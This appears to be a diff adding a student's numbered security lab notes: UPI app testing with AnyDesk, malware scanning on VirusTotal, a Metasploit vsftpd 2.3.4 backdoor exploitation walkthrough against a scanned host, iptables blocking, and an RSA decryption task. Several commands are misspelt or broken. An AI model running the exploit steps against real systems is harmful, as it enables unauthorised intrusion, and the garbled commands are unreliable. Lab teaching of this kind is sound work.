@@ -1,0 +1,70 @@
+10)   
+step 1: download and install upi application in your phone.
+        download and install anydesk in your phone and computer
+ste2 : test the security top of the application and fill the table
+step3 : connect both mobile and desktop  open any upi app.
+step 4: try sending some request amount using any online transaction to any of your contact.
+----------------------------------------------------------------------------------------
+9)
+step 1: open kali Linux and getch information about malware
+step 2: download walware.rar and extract here.  (from GitHub link)
+step 3: open browser in kali search filescan.io      (analyze link)
+step 4: upload the extracted file to the website . then analyses and gives an output file.
+step 5: open new browser  search virustotal.com
+step 6: click on choose file
+step 7: upload file.exe file and the report is generated . 
+------------------------------------------------------------------------------------------
+
+8)
+step 1: download the Metasploit using GitHub link
+step 2: search in a goggle Metasploit framework download.
+   |_____curl https://raw.githubuser content.com/rapid7/Metasploit - omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb>msfinastall && \ chmod 755 msfinstall &&\./msfinstall 
+  |___opt/metasploit-framework/bin/msf console
+
+step 3: after install Metasploit to run the framework
+step 4: after Metasploit console you type
+   |_______ifconfig   (ip address)
+
+step 5:  note the ip address copy and paste the nmap-zenmap tool
+step 6: take any explaoit port number from nmap-zenmap then search it in Metasploit frame work
+   |_______port 21 name of explaoit    vsFTPD
+     |______ search vsFTPD
+
+step 7: take the path from exlaoit and paste it in msf console 
+      |_______use path  (exploit/unix/ftp/vsftpd_234_backdoor)
+     |____path (exploit/unix/ftp/vsftpd_234_backdoor)
+    |____N
+    |____ info
+      |___set RHOST [ip address]
+     |____info
+      |_____exploit
+      |_____ls
+-----------------------------------------------------------------------------------------------
+5) 
+step 1: window : ipconfig  (window ip address)
+step 2: go to kali terminal ifconfig  (kali ip address)
+step 3: go to window type ping window_ip_address
+step 4: in kali  sudo iptables -A INPUT -s window_ip_address -j Drop     (block)  
+                 sudo iptables -D INPUT -s window_ip_address -j Drop     (unblock)
+step 5: sudo iptables -A INPUT -s kali_ip_address -p tcp --destination-port 80 -j DROP
+step 6: now open new browser in google search any thing it shows reload page.
+------------------------------------------------------------------------------------------------
+
+2) 
+step1 : mkdir rsa
+step 2: cd rsa
+step 3: ls
+step 4: cat enc.txt---*
+ step 5: cat pubkey.pem
+step 6: openssl rsa -public -inform PEM -text -noout <pubkey.pem   (copy module ) (exponent e)
+step 7: browser type hexa to decimal converter paste the module. click on module  copy the decimal code ( n) 
+step 8: touch exploit.py
+step 9: python exploit.py  (pip install pycryptodemo)
+step 10: openssl pkeyuh -decrypt -in key private.pem in  enc.txt -out dec.bin
+step 11: cat dec.bin
+Execute exploit.py file
+
+
+
+
+
